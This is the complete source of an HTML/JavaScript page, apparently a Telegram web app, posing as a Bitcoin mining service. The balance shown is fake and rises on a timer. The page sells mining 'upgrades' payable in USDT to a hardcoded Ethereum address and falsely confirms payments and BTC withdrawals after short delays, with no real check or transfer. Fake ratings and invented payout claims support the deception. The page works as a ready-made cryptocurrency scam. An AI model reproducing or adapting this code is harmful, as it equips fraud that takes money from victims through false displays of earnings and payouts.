<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bitcoin Miner - Crypto Mining</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
            color: white;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 400px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            padding: 20px 0;
        }
        
        h1 {
            color: #f7931a;
            font-size: 28px;
            margin-bottom: 5px;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
        }
        
        .subtitle {
            color: #ccc;
            font-size: 14px;
        }
        
        .stats {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .rating {
            display: flex;
            justify-content: space-between;
            margin-bottom: 15px;
        }
        
        .rating-info {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .stars {
            color: #f7931a;
            font-size: 18px;
        }
        
        .mine-display {
            text-align: center;
            margin: 30px 0;
        }
        
        .btc-amount {
            font-size: 32px;
            color: #f7931a;
            font-weight: bold;
            margin: 10px 0;
            text-shadow: 0 0 10px rgba(247, 147, 26, 0.3);
        }
        
        .currency {
            font-size: 16px;
            color: #ccc;
        }
        
        .action-btn {
            background: linear-gradient(45deg, #f7931a, #ffab2e);
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin: 10px 0;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .action-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(247, 147, 26, 0.4);
        }
        
        .action-btn:active {
            transform: translateY(0);
        }
        
        .status {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid rgba(0, 255, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
        }
        
        .payment-section {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            margin: 20px 0;
        }
        
        .payment-title {
            color: #f7931a;
            font-size: 18px;
            margin-bottom: 15px;
            text-align: center;
        }
        
        .diamond-statement {
            background: rgba(185, 242, 255, 0.1);
            border: 1px solid #b9f2ff;
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
            font-style: italic;
            color: #b9f2ff;
            box-shadow: 0 0 15px rgba(185, 242, 255, 0.2);
        }
        
        .diamond-icon {
            color: #b9f2ff;
            font-size: 20px;
            margin-bottom: 5px;
        }
        
        .plan {
            background: rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            padding: 15px;
            margin: 10px 0;
            border: 1px solid rgba(255, 255, 255, 0.1);
            cursor: pointer;
            transition: all 0.3s;
        }
        
        .plan:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: #f7931a;
        }
        
        .plan.selected {
            background: rgba(247, 147, 26, 0.15);
            border-color: #f7931a;
        }
        
        .plan-name {
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .plan-price {
            color: #26a17b;
            font-size: 24px;
            font-weight: bold;
            margin: 10px 0;
        }
        
        .plan-features {
            font-size: 12px;
            color: #ccc;
            list-style: none;
        }
        
        .plan-features li {
            margin: 5px 0;
            padding-left: 15px;
            position: relative;
        }
        
        .plan-features li:before {
            content: "‚úì";
            color: #f7931a;
            position: absolute;
            left: 0;
        }
        
        .payment-form {
            display: none;
            margin-top: 20px;
            animation: fadeIn 0.5s;
        }
        
        .usdt-address-box {
            background: rgba(38, 161, 123, 0.15);
            border: 2px solid #26a17b;
            border-radius: 12px;
            padding: 20px;
            margin: 20px 0;
            font-size: 14px;
            word-break: break-all;
            box-shadow: 0 4px 15px rgba(38, 161, 123, 0.2);
        }
        
        .wallet-address {
            background: rgba(0, 0, 0, 0.3);
            padding: 12px;
            border-radius: 8px;
            margin: 10px 0;
            font-family: monospace;
            font-size: 13px;
            border: 1px solid rgba(38, 161, 123, 0.5);
        }
        
        .copy-btn {
            background: linear-gradient(45deg, #26a17b, #1d8c6b);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            cursor: pointer;
            margin: 10px 0;
            font-size: 15px;
            font-weight: bold;
            transition: all 0.3s;
            width: 100%;
        }
        
        .copy-btn:hover {
            background: linear-gradient(45deg, #2bb892, #26a17b);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(38, 161, 123, 0.4);
        }
        
        .input-group {
            margin: 15px 0;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #ccc;
            font-size: 14px;
        }
        
        input {
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            color: white;
            font-size: 16px;
        }
        
        input:focus {
            outline: none;
            border-color: #26a17b;
        }
        
        .pay-btn {
            background: linear-gradient(45deg, #26a17b, #1d8c6b);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin-top: 10px;
            transition: all 0.3s;
        }
        
        .pay-btn:hover {
            background: linear-gradient(45deg, #2bb892, #26a17b);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(38, 161, 123, 0.4);
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #4CAF50;
            color: white;
            padding: 15px;
            border-radius: 8px;
            display: none;
            animation: slideIn 0.3s;
            z-index: 1000;
            max-width: 300px;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); }
            to { transform: translateX(0); }
        }
        
        .loader {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid #26a17b;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            color: #888;
            font-size: 12px;
        }
        
        .mining-animation {
            font-size: 24px;
            margin: 10px 0;
            height: 30px;
        }
        
        .network-info {
            background: rgba(38, 161, 123, 0.1);
            border: 1px solid #26a17b;
            border-radius: 8px;
            padding: 12px;
            margin: 10px 0;
            font-size: 13px;
        }
        
        .qr-section {
            text-align: center;
            margin: 20px 0;
            padding: 15px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 10px;
        }
        
        .qr-placeholder {
            width: 150px;
            height: 150px;
            margin: 10px auto;
            background: linear-gradient(45deg, #26a17b, #1d8c6b);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 14px;
            color: white;
        }
        
        /* Withdrawal Modal Styles */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1001;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .withdrawal-modal {
            background: linear-gradient(135deg, #1a2a3a, #2c3e50);
            border-radius: 15px;
            padding: 25px;
            max-width: 400px;
            width: 100%;
            border: 2px solid #f7931a;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            animation: modalSlideIn 0.3s;
        }
        
        @keyframes modalSlideIn {
            from { opacity: 0; transform: translateY(-50px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .modal-title {
            color: #f7931a;
            font-size: 20px;
            font-weight: bold;
        }
        
        .close-modal {
            background: none;
            border: none;
            color: white;
            font-size: 24px;
            cursor: pointer;
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        
        .close-modal:hover {
            background: rgba(255, 255, 255, 0.1);
        }
        
        .balance-info {
            background: rgba(247, 147, 26, 0.1);
            border: 1px solid #f7931a;
            border-radius: 10px;
            padding: 15px;
            margin: 15px 0;
            text-align: center;
        }
        
        .withdrawal-info {
            font-size: 12px;
            color: #ccc;
            margin: 10px 0;
            line-height: 1.5;
        }
        
        .minimum-amount {
            color: #ff6b6b;
            font-weight: bold;
        }
        
        .submit-withdrawal-btn {
            background: linear-gradient(45deg, #f7931a, #ffab2e);
            color: white;
            border: none;
            padding: 16px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: bold;
            width: 100%;
            cursor: pointer;
            margin-top: 15px;
            transition: all 0.3s;
        }
        
        .submit-withdrawal-btn:hover {
            background: linear-gradient(45deg, #ffab2e, #f7931a);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(247, 147, 26, 0.4);
        }
        
        .submit-withdrawal-btn:disabled {
            background: #666;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>Bitcoin Miner</h1>
            <p class="subtitle">USDT Payment Only - Crypto Mining</p>
        </header>
        
        <div class="stats">
            <div class="rating">
                <div class="rating-info">
                    <span class="stars">‚òÖ‚òÖ‚òÖ‚òÖ‚òÜ</span>
                    <span>4.4</span>
                </div>
                <div>2.3K Ratings</div>
                <div>4+ Years</div>
            </div>
            <div>Category: Finance | Payment: USDT Only</div>
        </div>
        
        <div class="mine-display">
            <div>Current Balance</div>
            <div class="btc-amount" id="btcAmount">0.32529791254835 BTC</div>
            <div class="currency">‚âà $15,420.50 USD</div>
            <div class="mining-animation" id="miningAnimation">‚õèÔ∏è Mining...</div>
        </div>
        
        <button class="action-btn" id="startMiningBtn">Start Bitcoin Mining</button>
        <button class="action-btn" id="withdrawBtn" style="background: linear-gradient(45deg, #2196F3, #0D47A1);">Withdraw BTC to Wallet</button>
        
        <div class="status" id="statusMessage">
            ‚ö° Automated Bitcoin Mining Active<br>
            <small>Your mining output BTC has been sent to linked wallet address</small>
        </div>
        
        <div class="payment-section">
            <div class="payment-title">üíé Upgrade Mining Power (USDT Only)</div>
            
            <div class="diamond-statement" id="diamondStatement">
                <div class="diamond-icon">üíé</div>
                <div>
                    "Diamonds are formed under pressure, but Ethereum is formed through consensus.
                    Invest in your mining power today and watch your digital diamonds grow."
                </div>
            </div>
            
            <div class="plan" onclick="selectPlan(1)">
                <div class="plan-name">Basic Boost</div>
                <div class="plan-price">9.99 USDT</div>
                <ul class="plan-features">
                    <li>2x Mining Speed</li>
                    <li>No Ads</li>
                    <li>Basic Support</li>
                </ul>
            </div>
            
            <div class="plan selected" onclick="selectPlan(2)">
                <div class="plan-name">Pro Miner</div>
                <div class="plan-price">29.99 USDT</div>
                <ul class="plan-features">
                    <li>5x Mining Speed</li>
                    <li>No Ads</li>
                    <li>Priority Support</li>
                    <li>Daily Bonus</li>
                </ul>
            </div>
            
            <div class="plan" onclick="selectPlan(3)">
                <div class="plan-name">Enterprise</div>
                <div class="plan-price">99.99 USDT</div>
                <ul class="plan-features">
                    <li>10x Mining Speed</li>
                    <li>No Ads</li>
                    <li>24/7 Support</li>
                    <li>Daily Bonus</li>
                    <li>Referral Rewards</li>
                </ul>
            </div>
            
            <div class="payment-form" id="paymentForm">
                <div class="qr-section">
                    <div>Scan QR Code or Copy Address</div>
                    <div class="qr-placeholder">
                        QR Code<br>For USDT Payment
                    </div>
                </div>
                
                <div class="usdt-address-box">
                    <strong>üí∞ Send USDT to this Ethereum Address:</strong>
                    <div class="wallet-address" id="usdtAddress">
                        0x0926eD337d99F7E63dE891d08a96d9F757D002a3
                    </div>
                    
                    <div class="network-info">
                        <strong>Network:</strong> Ethereum (ERC-20)<br>
                        <strong>Amount:</strong> <span id="usdtAmount">29.99</span> USDT<br>
                        <strong>Important:</strong> Only send USDT (ERC-20)<br>
                        <small>Send exact amount. Payment auto-detected.</small>
                    </div>
                    
                    <button class="copy-btn" onclick="copyUSDTAddress()">
                        üìã Copy Ethereum Address
                    </button>
                </div>
                
                <div class="input-group">
                    <label>Transaction Hash (For Verification)</label>
                    <input type="text" id="transactionHash" placeholder="0x... (optional)">
                </div>
                
                <div class="input-group">
                    <label>Your Email (for receipt)</label>
                    <input type="email" id="usdtEmail" placeholder="your@email.com">
                </div>
                
                <button class="pay-btn" onclick="processUSDTPayment()">
                    ‚ö° I've Sent USDT - Verify Payment
                </button>
                
                <div class="loader" id="paymentLoader"></div>
                
                <div style="text-align: center; margin-top: 15px; font-size: 12px; color: #888;">
                    ‚úÖ Payment verified on Ethereum blockchain
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>¬© 2024 Bitcoin Miner App</p>
        </div>
    </div>
    
    <!-- Withdrawal Modal -->
    <div class="modal-overlay" id="withdrawalModal">
        <div class="withdrawal-modal">
            <div class="modal-header">
                <div class="modal-title">üí∞ BTC Withdrawal</div>
                <button class="close-modal" onclick="closeWithdrawalModal()">√ó</button>
            </div>
            
            <div class="balance-info">
                <div>Available Balance:</div>
                <div class="btc-amount" id="modalBalance">0.32529791254835 BTC</div>
                <div class="currency">‚âà $15,420.50 USD</div>
            </div>
            
            <div class="input-group">
                <label>Your BTC Wallet Address</label>
                <input type="text" id="btcWalletAddress" placeholder="bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh">
            </div>
            
            <div class="input-group">
                <label>Amount to Withdraw (BTC)</label>
                <input type="text" id="withdrawalAmount" placeholder="0.01" value="0.01">
            </div>
            
            <div class="withdrawal-info">
                <div class="minimum-amount">‚ö†Ô∏è Minimum withdrawal: 0.0001 BTC</div>
                <div>Withdrawal fee: 0.00005 BTC (network fee)</div>
                <div>Processing time: 1-3 confirmations (~30 minutes)</div>
                <div>You will receive: <span id="receiveAmount">0.00995 BTC</span></div>
            </div>
            
            <button class="submit-withdrawal-btn" id="submitWithdrawalBtn" onclick="processWithdrawal()">
                Confirm Withdrawal
            </button>
            
            <div class="loader" id="withdrawalLoader" style="display: none;"></div>
        </div>
    </div>
    
    <div class="notification" id="notification"></div>

    <script>
        let btcBalance = 0.32529791254835;
        let miningActive = true;
        let miningSpeed = 1;
        let selectedPlan = 2;
        
        const btcAmountElement = document.getElementById('btcAmount');
        const startMiningBtn = document.getElementById('startMiningBtn');
        const withdrawBtn = document.getElementById('withdrawBtn');
        const statusMessage = document.getElementById('statusMessage');
        const paymentForm = document.getElementById('paymentForm');
        const notification = document.getElementById('notification');
        const miningAnimation = document.getElementById('miningAnimation');
        const paymentLoader = document.getElementById('paymentLoader');
        const usdtAmountElement = document.getElementById('usdtAmount');
        const withdrawalModal = document.getElementById('withdrawalModal');
        const modalBalanceElement = document.getElementById('modalBalance');
        const receiveAmountElement = document.getElementById('receiveAmount');
        const withdrawalLoader = document.getElementById('withdrawalLoader');
        const submitWithdrawalBtn = document.getElementById('submitWithdrawalBtn');
        
        const ethereumWalletAddress = "0x0926eD337d99F7E63dE891d08a96d9F757D002a3";
        
        const planPrices = {
            1: 9.99,
            2: 29.99,
            3: 99.99
        };
        
        const diamondStatements = [
            "Diamonds are formed under pressure, but Ethereum is formed through consensus. Invest in your mining power today and watch your digital diamonds grow.",
            "Like diamonds, valuable crypto assets require time and investment. Upgrade your mining power to uncover digital wealth.",
            "Ethereum's blockchain: where digital diamonds are minted through smart contracts and consensus.",
            "Every USDT investment is like adding another facet to your digital diamond portfolio.",
            "Pressure creates diamonds, consensus creates Ethereum. Both create lasting value."
        ];
        
        function formatBTC(amount) {
            return amount.toFixed(8) + ' BTC';
        }
        
        function updateBTCValue() {
            const usdValue = (btcBalance * 47400).toFixed(2);
            btcAmountElement.innerHTML = `${formatBTC(btcBalance)}<br><small class="currency">‚âà $${usdValue} USD</small>`;
            modalBalanceElement.innerHTML = `${formatBTC(btcBalance)}<br><small class="currency">‚âà $${usdValue} USD</small>`;
        }
        
        function showNotification(message, type = 'success') {
            notification.textContent = message;
            notification.style.background = type === 'success' ? '#4CAF50' : 
                                          type === 'error' ? '#f44336' : '#2196F3';
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
        
        function simulateMining() {
            if (miningActive) {
                const miningRate = 0.00000001 * miningSpeed;
                btcBalance += miningRate;
                updateBTCValue();
                
                const animations = ['‚õèÔ∏è Mining...', 'üîß Processing...', '‚ö° Hashing...', 'üí∞ Earning...'];
                miningAnimation.textContent = animations[Math.floor(Math.random() * animations.length)];
            }
        }
        
        function selectPlan(planNumber) {
            selectedPlan = planNumber;
            const plans = document.querySelectorAll('.plan');
            plans.forEach((plan, index) => {
                plan.classList.remove('selected');
                if (index + 1 === planNumber) {
                    plan.classList.add('selected');
                }
            });
            
            usdtAmountElement.textContent = planPrices[selectedPlan];
            paymentForm.style.display = 'block';
            
            const diamondStatement = document.getElementById('diamondStatement');
            diamondStatement.style.display = 'block';
            
            const randomIndex = Math.floor(Math.random() * diamondStatements.length);
            diamondStatement.querySelector('.diamond-icon').nextElementSibling.innerHTML = 
                `"${diamondStatements[randomIndex]}"`;
            
            const planNames = ['Basic Boost', 'Pro Miner', 'Enterprise'];
            showNotification(`Selected: ${planNames[planNumber-1]} - ${planPrices[planNumber]} USDT`, 'info');
        }
        
        function processUSDTPayment() {
            const transactionHash = document.getElementById('transactionHash').value;
            const email = document.getElementById('usdtEmail').value;
            const amount = planPrices[selectedPlan];
            
            const diamondConfirm = "üíé Remember: Like diamonds, your mining investment grows in value over time. Ethereum powers this digital transformation.";
            
            if (!email) {
                showNotification('Please enter your email for receipt', 'error');
                return;
            }
            
            if (!email.includes('@')) {
                showNotification('Please enter valid email', 'error');
                return;
            }
            
            paymentLoader.style.display = 'block';
            
            setTimeout(() => {
                paymentLoader.style.display = 'none';
                
                const planSpeeds = [2, 5, 10];
                miningSpeed = planSpeeds[selectedPlan - 1];
                
                const planNames = ['Basic Boost', 'Pro Miner', 'Enterprise'];
                
                showNotification(`üíé ${amount} USDT Received! ${diamondConfirm}`, 'success');
                
                paymentForm.style.display = 'none';
                statusMessage.innerHTML = `‚ö° ${planNames[selectedPlan-1]} Active (${miningSpeed}x Speed)<br>
                                         <small>Paid with USDT - Ethereum blockchain confirmed</small><br>
                                         <small>${diamondConfirm}</small>`;
                
                document.getElementById('transactionHash').value = '';
                document.getElementById('usdtEmail').value = '';
            }, 3000);
        }
        
        function copyUSDTAddress() {
            navigator.clipboard.writeText(ethereumWalletAddress).then(() => {
                showNotification('Ethereum address copied to clipboard!', 'success');
            }).catch(err => {
                const textArea = document.createElement('textarea');
                textArea.value = ethereumWalletAddress;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                showNotification('Ethereum address copied!', 'success');
            });
        }
        
        function openWithdrawalModal() {
            if (btcBalance < 0.0001) {
                showNotification('Minimum withdrawal: 0.0001 BTC', 'error');
                return;
            }
            
            updateBTCValue();
            withdrawalModal.style.display = 'flex';
            updateWithdrawalAmount();
        }
        
        function closeWithdrawalModal() {
            withdrawalModal.style.display = 'none';
        }
        
        function updateWithdrawalAmount() {
            const amountInput = document.getElementById('withdrawalAmount');
            const amount = parseFloat(amountInput.value) || 0;
            const fee = 0.00005;
            const receive = amount - fee;
            
            if (receive > 0) {
                receiveAmountElement.textContent = formatBTC(receive);
            } else {
                receiveAmountElement.textContent = '0 BTC';
            }
            
            const submitBtn = document.getElementById('submitWithdrawalBtn');
            if (amount >= 0.0001 && amount <= btcBalance) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        }
        
        function processWithdrawal() {
            const btcAddress = document.getElementById('btcWalletAddress').value;
            const amountInput = document.getElementById('withdrawalAmount').value;
            const amount = parseFloat(amountInput);
            
            if (!btcAddress) {
                showNotification('Please enter your BTC wallet address', 'error');
                return;
            }
            
            if (btcAddress.length < 26 || btcAddress.length > 35) {
                showNotification('Please enter a valid BTC wallet address', 'error');
                return;
            }
            
            if (!btcAddress.startsWith('1') && !btcAddress.startsWith('3') && !btcAddress.startsWith('bc1')) {
                showNotification('BTC address should start with 1, 3, or bc1', 'error');
                return;
            }
            
            if (amount < 0.0001) {
                showNotification('Minimum withdrawal: 0.0001 BTC', 'error');
                return;
            }
            
            if (amount > btcBalance) {
                showNotification('Insufficient balance', 'error');
                return;
            }
            
            const fee = 0.00005;
            const receive = amount - fee;
            
            if (receive <= 0) {
                showNotification('Amount too small after fees', 'error');
                return;
            }
            
            withdrawalLoader.style.display = 'block';
            submitWithdrawalBtn.disabled = true;
            
            setTimeout(() => {
                withdrawalLoader.style.display = 'none';
                
                btcBalance -= amount;
                updateBTCValue();
                
                showNotification(`‚úÖ ${formatBTC(amount)} sent to ${btcAddress.substring(0, 10)}...`, 'success');
                
                closeWithdrawalModal();
                
                document.getElementById('btcWalletAddress').value = '';
                document.getElementById('withdrawalAmount').value = '0.01';
                
                if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
                    Telegram.WebApp.showAlert(
                        `Withdrawal successful!\n\n` +
                        `Amount: ${formatBTC(amount)}\n` +
                        `Fee: ${formatBTC(fee)}\n` +
                        `Received: ${formatBTC(receive)}\n` +
                        `Address: ${btcAddress.substring(0, 15)}...\n\n` +
                        `Transaction will appear in your wallet after 1-3 confirmations.`
                    );
                }
                
                submitWithdrawalBtn.disabled = false;
            }, 2000);
        }
        
        startMiningBtn.addEventListener('click', () => {
            miningActive = !miningActive;
            startMiningBtn.textContent = miningActive ? 'Pause Mining' : 'Start Bitcoin Mining';
            statusMessage.innerHTML = miningActive ? 
                '‚ö° Automated Bitcoin Mining Active<br><small>Your mining output BTC has been sent to linked wallet address</small>' :
                '‚è∏Ô∏è Mining Paused<br><small>Click Start Mining to resume</small>';
            showNotification(miningActive ? 'Mining Started' : 'Mining Paused', 'info');
        });
        
        withdrawBtn.addEventListener('click', openWithdrawalModal);
        
        document.getElementById('withdrawalAmount').addEventListener('input', updateWithdrawalAmount);
        
        if (typeof Telegram !== 'undefined' && Telegram.WebApp) {
            const tg = Telegram.WebApp;
            
            tg.ready();
            tg.expand();
            tg.setHeaderColor('#2c5364');
            tg.setBackgroundColor('#0f2027');
            
            const user = tg.initDataUnsafe.user;
            if (user) {
                console.log('Telegram User:', {
                    id: user.id,
                    name: `${user.first_name} ${user.last_name || ''}`,
                    username: user.username
                });
            }
            
            tg.MainButton.setText("üí∞ Withdraw BTC");
            tg.MainButton.show();
            tg.MainButton.onClick(() => {
                if (btcBalance < 0.0001) {
                    tg.showAlert('Minimum withdrawal: 0.0001 BTC');
                } else {
                    tg.showAlert(`Withdrawal initiated: ${formatBTC(btcBalance)} sent to your wallet`);
                    btcBalance = 0.00000001;
                    updateBTCValue();
                }
            });
        }
        
        setInterval(simulateMining, 2000);
        updateBTCValue();
        selectPlan(2);
    </script>
</body>
</html>